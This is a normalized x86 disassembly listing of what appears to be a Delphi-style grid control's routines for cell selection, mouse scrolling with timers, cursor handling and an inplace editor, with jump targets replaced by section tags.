push 0x1
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SetTimer
sub_475258
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4727b4
mov al [ ebx + 0x28e ]
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_472758
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x238 ]
jl r-xdata
dec eax
sub al 0x2
jb r-xdata
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44b838
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x23c ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4731a8
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x60 ]
inc eax
cmp eax [ ebp - 0xc ]
jl r-xdata
mov eax [ ebx + 0x268 ]
add eax esi
mov [ ebx + 0x264 ] eax
mov eax [ ebx + 0x268 ]
add eax edi
mov [ ebx + 0x264 ] eax
jmp r-xdata
mov eax [ ebp - 0x30 ]
inc eax
cmp eax [ ebp - 0x8 ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4731a8
mov al [ ebx + 0x28e ]
dec al
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x210 ]
jne r-xdata
sub al 0x3
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_473d98
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x214 ]
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_419174
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4756b0
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_419174
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_4756b0
jmp r-xdata
jmp r-xdata
sub_4753bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov esi [ edx + 0x260 ]
dec esi
sub esi eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x264 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0x4 ] eax
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
sub_475414
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor edx edx
push ebp
push sub_47569f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push edi
mov ecx ebx
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_403450
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call KillTimer
mov eax [ ebp - 0x4 ]
call sub_475e54
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403450
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
push ebx
push edi
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44b8e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4756a6
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_4727b4
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_4731a8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4732e8
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_419174
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9e
call sub_403450
test al al
je r-xdata
dec al
je r-xdata
push ebp
lea eax [ ebp - 0x38 ]
call sub_4753bc
pop ecx
cmp eax 0x1
jle r-xdata
push ebp
lea eax [ ebp - 0x68 ]
call sub_4753bc
pop ecx
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4499bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
mov eax [ ebp - 0x4 ]
call sub_475e54
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4732e8
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_419174
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9f
call sub_403450
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_475cb8
mov eax [ ebp - 0x4 ]
call sub_476608
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_475948
mov eax [ ebp - 0x4 ]
call sub_476608
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_471a4c
mov eax [ ebp - 0x4 ]
call sub_476608
mov eax [ ebp - 0x4 ]
call sub_475e54
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_475e54
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_471974
mov eax [ ebp - 0x4 ]
call sub_476608
sub_4756b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x10 ]
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x270 ]
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax ebx
call sub_4499bc
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x20 ]
dec eax
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
call sub_4732e8
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ edi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ edi + 0x14 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x270 ]
cmp edx eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_473b7c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_4727b4
cmp [ ebx + 0x28e ] 0x5
jne r-xdata
mov eax [ ebx + 0x270 ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ edi + 0x20 ]
dec edx
cmp eax edx
jge r-xdata
cmp [ ebx + 0x28e ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa1
call sub_403450
test al al
jne r-xdata
push 0x0
push 0x0
mov ecx 0x1
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_473b7c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_4727b4
mov eax ebx
call sub_4732e8
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa0
call sub_403450
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x270 ] eax
sub_4758ec
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x21c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x238 ]
jg r-xdata
mov esi 0x1
mov ecx [ ebx + 0x24c ]
mov edx esi
mov eax ebx
call sub_473008
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
dec edx
mov eax ebx
call sub_475a80
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_475948
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4759e6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea eax [ ebx + 0x220 ]
mov ecx [ ebx + 0x230 ]
mov edx [ ebx + 0x21c ]
call sub_470704
mov eax [ ebx + 0x220 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_470308
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4759ed
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_473fcc
mov eax [ ebx + 0x220 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa5
call sub_403450
sub_4759f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
mov eax ebx
mov si 0xffa5
call sub_403450
mov eax ebx
call sub_473750
pop esi
pop ebx
retn
lea eax [ ebx + 0x220 ]
xor ecx ecx
xor edx edx
call sub_470704
sub_475a30
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
mov [ ebx + 0x234 ] esi
mov eax ebx
mov si 0xffa4
call sub_403450
mov eax ebx
call sub_473750
pop esi
pop ebx
retn
lea eax [ ebx + 0x250 ]
xor ecx ecx
xor edx edx
call sub_470704
sub_475a80
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475b08
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x238 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475b0f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_470308
mov [ ebx + 0x238 ] esi
mov eax ebx
call sub_4736cc
mov eax ebx
call sub_473750
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x8 ]
call sub_470308
sub_475b18
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475ba0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x23c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475ba7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_470308
mov [ ebx + 0x23c ] esi
mov eax ebx
call sub_4736cc
mov eax ebx
call sub_473750
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x8 ]
call sub_470308
sub_475bb0
push ebx
mov ebx eax
test dl dl
jne r-xdata
mov eax ebx
call sub_4716e4
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4716d4
pop ebx
retn
pop ebx
retn
call sub_470e6c
sub_475bec
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x248 ]
je r-xdata
pop edx
pop ebx
retn
test [ esp + 0x1 ] 0x10
je r-xdata
mov ax [ esp ]
mov [ ebx + 0x248 ] ax
cmp [ ebx + 0x28d ] 0x0
jne r-xdata
and [ esp ] 0xdfff
test [ esp + 0x1 ] 0x10
je r-xdata
test [ esp + 0x1 ] 0x20
je r-xdata
mov eax ebx
call sub_473750
push 0x1
push 0x0
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_473e20
mov eax ebx
call sub_4716d4
mov eax ebx
call sub_4716e4
jmp r-xdata
sub_475c7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x24c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x23c ]
jg r-xdata
mov esi 0x1
mov ecx esi
mov edx [ ebx + 0x21c ]
mov eax ebx
call sub_473008
mov edx esi
dec edx
mov eax ebx
call sub_475b18
sub_475cb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475d56
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea eax [ ebx + 0x250 ]
mov ecx [ ebx + 0x234 ]
mov edx [ ebx + 0x24c ]
call sub_470704
mov eax [ ebx + 0x250 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_470308
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475d5d
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_473fd8
mov eax [ ebx + 0x250 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa4
call sub_403450
sub_475d78
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_475dd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_475f34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_470f10
retn
sub_475de4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
mov eax [ eax + 0x228 ]
mov edx [ ebx ]
mov [ edx + 0x280 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
mov edx [ ebx ]
mov [ edx + 0x284 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_46d538
inc eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x1
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x0
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_440878
pop ebx
pop ebp
retn
sub_475e54
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x280 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd0 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x27c ] ebx
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_470824
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
push ebp
call sub_475de4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_475d78
push ebp
call sub_475de4
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x284 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x22c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x228 ]
mov eax [ ebp - 0x4 ]
call sub_4715c4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_471088
sub_475f34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_475f9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x280 ]
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475fa1
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
cmp [ ebx + 0x284 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x27c ]
call sub_46d0e4
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x284 ]
mov edx esi
mov eax ebx
mov si 0xffae
call sub_403450
sub_475fa8
test [ eax + 0x249 ] 0x4
je r-xdata
call sub_44f808
retn
mov cl [ edx + 0x4 ]
sub cl 0x8
je r-xdata
mov dl [ edx + 0x4 ]
call sub_4716f4
retn
add cl 0xe8
sub cl 0xe0
jae r-xdata
sub_475fd0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4507d8
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ax [ edi + 0x6 ]
sub ax 0x300
jne r-xdata
mov eax ebx
call sub_475f34
sub_476034
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44eee8
mov edx esp
mov eax ebx
call sub_475868
mov edx esp
mov eax ebx
call sub_473758
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4507d8
cmp eax [ esi + 0x4 ]
je r-xdata
mov eax ebx
call sub_475d78
sub_4760a8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
lea edx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
call sub_406e68
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_449afc
mov eax [ esp ]
mov [ ebx + 0x274 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x278 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_4760ec
push ebx
push esi
push edi
push ebp
add esp 0xffffff90
mov edi edx
mov esi eax
xor ebx ebx
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov al [ esi + 0x28e ]
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_44edd4
push ebx
call SetCursor
jmp r-xdata
mov [ esp ] al
lea edx [ esp + 0x10 ]
mov eax esi
call sub_4727b4
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx [ esi + 0x278 ]
mov edx [ esi + 0x274 ]
mov eax esi
mov ebp [ eax ]
call [ ebp + 0xcc ]
jmp r-xdata
add esp 0x70
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff1
call sub_468bcc
mov ebx eax
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff2
call sub_468bcc
mov ebx eax
sub_476198
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44eed4
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
mov edx esp
mov eax ebx
call sub_475868
mov edx esp
mov eax ebx
call sub_473758
mov eax ebx
call sub_475e54
mov eax edi
call sub_4507d8
cmp eax [ esi + 0x4 ]
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4761e4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44ed8c
mov eax ebx
call sub_474760
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47623c
push ebp
mov ebp esp
add esp 0xffffff98
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4762c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call KillTimer
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4762cc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_4727b4
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_4731a8
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_4732e8
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call KillTimer
jmp r-xdata
sub_4762e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_47623c
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_476310
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44fcfc
pop esi
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_44a0ac
sub_476348
push ebx
push esi
mov ebx edx
mov esi eax
movsx ecx [ ebx + 0xa ]
movsx edx [ ebx + 0x8 ]
mov eax esi
call sub_471adc
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_476368
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x249 ] 0x4
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0xd
jne r-xdata
mov [ esi + 0xc ] 0x1
sub_476390
add esp 0xffffffec
mov [ esp ] dl
mov edx [ eax + 0x210 ]
mov [ esp + 0xc ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x21c ]
dec edx
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x24c ]
dec edx
mov [ esp + 0x8 ] edx
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ eax + 0x238 ]
jle r-xdata
test [ esp ] 0x4
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0x4 ]
jge r-xdata
dec [ esp + 0xc ]
test [ esp ] 0x8
je r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ eax + 0x23c ]
jle r-xdata
inc [ esp + 0xc ]
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0xc ]
jne r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x8 ]
jge r-xdata
dec [ esp + 0x10 ]
lea edx [ esp + 0xc ]
call sub_473d98
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x10 ]
je r-xdata
inc [ esp + 0x10 ]
add esp 0x14
retn
sub_476444
push ebx
push esi
push edi
add esp 0xffffff88
mov edi eax
mov al [ edi + 0x28e ]
sub al 0x1
je r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x70 ]
mov edx esp
mov eax edi
call sub_449afc
mov eax [ esp + 0x70 ]
mov [ esp ] eax
mov eax [ esp + 0x74 ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov eax edi
call sub_4727b4
mov bl [ r-xdata ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax edi
call sub_472758
mov al [ edi + 0x28e ]
dec al
je r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
sub al 0x3
je r-xdata
add esp 0x78
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4499bc
mov esi eax
sub esi [ esp + 0x24 ]
mov eax edi
call sub_4499bc
sub eax [ esp + 0x14 ]
mov edx [ esp ]
cmp esi edx
jle r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x14 ]
jge r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x44 ]
push eax
push 0x1
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov eax edi
call sub_4756b0
jmp r-xdata
dec al
jne r-xdata
cmp eax edx
jge r-xdata
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x24 ]
jle r-xdata
or bl 0x1
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x14 ]
push eax
push 0x0
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov eax edi
call sub_4756b0
jmp r-xdata
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0x44 ]
jge r-xdata
